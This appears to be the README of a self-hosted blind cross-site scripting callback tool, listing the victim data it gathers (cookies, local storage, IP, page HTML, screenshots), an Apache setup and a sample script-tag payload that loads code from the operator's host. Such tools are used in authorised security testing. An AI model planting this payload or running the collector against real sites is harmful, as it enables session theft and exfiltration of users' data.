<h1 align="center">bxss</h1>

<h4 align="center">My alternative to XSS Hunter for blind XSS.</h4>

<p align="center">
    <img src="https://img.shields.io/badge/php-%3E=5.5-blue" alt="php badge">
    <img src="https://img.shields.io/badge/license-MIT-green" alt="MIT license badge">
    <a href="https://twitter.com/intent/tweet?text=https%3a%2f%2fgithub.com%2fgwen001%2fbxss%2f" target="_blank"><img src="https://img.shields.io/twitter/url?style=social&url=https%3A%2F%2Fgithub.com%2Fgwen001%2Fbxss" alt="twitter badge"></a>
</p>

<!-- <p align="center">
    <img src="https://img.shields.io/github/stars/gwen001/bxss?style=social" alt="github stars badge">
    <img src="https://img.shields.io/github/watchers/gwen001/bxss?style=social" alt="github watchers badge">
    <img src="https://img.shields.io/github/forks/gwen001/bxss?style=social" alt="github forks badge">
</p> -->

---

## Features

- reports stored in `sqlite` database
- call logged in log file
- report send on Slack channel (beta)
- data collected: 
    - vulnerable URL
    - referer URL
    - victim IP
    - victim User-Agent
    - victim cookies
    - victim locale storage
    - HTML of the vulnerable page
    - screenshot of the vulnerable page

Todo:  
    - report send by mail

## Install

```
git clone https://github.com/gwen001/bxss
```

The web user should have write access on the directory `images`.

## Configure domain

Using Apache, you can easily configure a vhost like this:

```
<IfModule mod_ssl.c>
<VirtualHost *:443>
	ServerName x.example.com
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html/bxss/
	SSLCertificateFile /etc/letsencrypt/live/x.example.com/fullchain.pem
	SSLCertificateKeyFile /etc/letsencrypt/live/x.example.com/privkey.pem
</VirtualHost>
</IfModule>

<VirtualHost *:80>
	ServerName x.example.com
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html/bxss/
</VirtualHost>
```

## Injection

As soon as the script is available online, you can use your favorite XSS payload:
```
<script src=http://x.example.com></script>
```

---

<img src="https://raw.githubusercontent.com/gwen001/bxss/main/preview.png" />

---

Feel free to [open an issue](/../../issues/) if you have any problem with the script.  

